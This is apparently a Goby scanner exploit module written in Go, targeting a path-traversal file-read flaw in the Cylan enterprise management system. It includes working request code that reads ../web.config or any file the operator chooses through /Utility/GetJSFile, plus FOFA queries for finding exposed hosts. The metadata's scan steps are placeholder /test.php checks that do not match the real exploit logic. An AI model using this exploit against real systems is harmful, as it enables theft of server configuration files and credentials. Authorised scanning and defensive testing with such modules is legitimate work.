package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "CylanManageSystem GetJSFile File Read Vulnerability",
    "Description": "<p>Shenzhen Cylan Technology Co., Ltd. boasts industry-leading capabilities in intelligent terminal hardware development. Its proprietary smart home brand, \"Kan Jia Wang\" (Home Guardian), aims to make home living more aspirational through technology. The brand adheres to its mission of making home life smarter, more convenient, and always prioritizes quality innovation and user value. It is committed to providing users with intelligent, comfortable, convenient, safe, and energy-efficient home smart hardware devices.</p>",
    "Product": "Cylan",
    "Homepage": "http://www.cylan.com.cn/",
    "DisclosureDate": "2024-07-19",
    "PostTime": "2024-07-22",
    "Author": "1538279017@qq.com",
    "FofaQuery": "(body=\"企业管理系统\" && body=\"赛蓝\") || body=\"http://www.cailsoft.com\" ",
    "GobyQuery": "(body=\"企业管理系统\" && body=\"赛蓝\") || body=\"http://www.cailsoft.com\" ",
    "Level": "1",
    "Impact": "<p>If a website has a file reading vulnerability, an attacker could use simple path traversal techniques (such as ../) to access sensitive files stored on the server, such as user databases or configuration files, thereby obtaining personal information, passwords, or other confidential data.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.cylan.com.cn/\">http://www.cylan.com.cn/</a>2. Set access policies and whitelist access through security devices such as firewalls.3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://cn-sec.com/archives/2972619.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.9",
    "Translation": {
        "CN": {
            "Name": "赛蓝企业管理系统 GetJSFile 文件读取漏洞",
            "Product": "赛蓝科技有限公司",
            "Description": "<p>深圳市赛蓝科技有限公司，具备行业领先的智能终端硬件开发能力，自主拥有的智能家居品牌“看家王”，以科技让家居更有梦想为品牌愿景，始终践行“让家居生活更智能、更便捷”的使命，坚持品质创新、用户价值为先的核心原则，致力于为用户提供智能、舒适、便捷、安全、节能的家庭智能硬件设备。 “看家王”依托于赛蓝云平台的核心优势，以移动物联网为基础，通过打造多条智能家居产业价值链条，将全方位的为智能家庭构建智能化、数字化、便捷化的生活方式。 目前，“看家王”产品线已囊括智能摄像头、台灯、自动投食机等产品线，并以先导性迅速占领市场，引领2B业务发展。产品获得欧盟RoHS环保认证，不仅在国内畅销，更远销北美、南美、欧洲等海外市场，赢得了广大消费者的一致认可，直接为国内外消费者带来便携化、数字化、智能化生活体验<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.cylan.com.cn/\">http://www.cylan.com.cn/</a>2、通过防火墙等安全设备设置访问策略，设置白名单访问。3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>网站存在文件读取漏洞，攻击者可以通过简单的路径遍历（如../）获取服务器上存储的敏感文件，例如用户数据库或配置文件，从而获取用户的个人信息、密码或其他机密数据。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "CylanManageSystem GetJSFile File Read Vulnerability",
            "Product": "Cylan",
            "Description": "<p>Shenzhen Cylan Technology Co., Ltd. boasts industry-leading capabilities in intelligent terminal hardware development. Its proprietary smart home brand, \"Kan Jia Wang\" (Home Guardian), aims to make home living more aspirational through technology. The brand adheres to its mission of making home life smarter, more convenient, and always prioritizes quality innovation and user value. It is committed to providing users with intelligent, comfortable, convenient, safe, and energy-efficient home smart hardware devices.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.cylan.com.cn/\">http://www.cylan.com.cn/</a>2. Set access policies and whitelist access through security devices such as firewalls.3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>If a website has a file reading vulnerability, an attacker could use simple path traversal techniques (such as <code>../</code>) to access sensitive files stored on the server, such as user databases or configuration files, thereby obtaining personal information, passwords, or other confidential data.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10976"
}`

	postOrGet_fiejjifepu := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {

		//发送get请求
		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/Utility/GetJSFile?filePath=" + fileUrl
		resp, err := setGetRequest(hostInfo, path, map[string]string{})

		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 此处需要修改：设置成功后的vulurl

			vulURL := "/Utility/GetJSFile?filePath="

			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件

			defaultModeMap := map[string]string{

				"../web.config": "</dependentAssembly>",
			}

			// 函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意：后续代码为模板代码，非特殊情况，无需更改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			for fileUrl, fileText := range defaultModeMap {

				resp, err := uploadFileFunc(u, fileUrl)

				if err != nil {

					continue

				}

				if strings.Contains(resp, fileText) {

					// 设置VULURL

					ss.VulURL = u.HostInfo + vulURL

					return true

				}

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			var fileUrl string

			var fileText string

			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件

			defaultModeMap := map[string][2]string{}

			// 此处需要修改：函数继承

			uploadFileFunc := postOrGet_fiejjifepu

			// 请注意，后续代码为模板固化，正常情况下均无需修改

			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			if mode == "Customize" {

				fileUrl = goutils.B2S(ss.Params["Customize"])

			} else {

				if _, ok := defaultModeMap[mode]; ok {

					fileUrl = defaultModeMap[mode][0]

					fileText = defaultModeMap[mode][1]

				} else {

					expResult.Success = false

					return expResult

				}

			}

			// 获取返回结果url和返回请求头

			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)

			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {

				expResult.Success = false

				return expResult

			}

			expResult.Success = true

			expResult.Output = resp

			return expResult

		},
	))
}
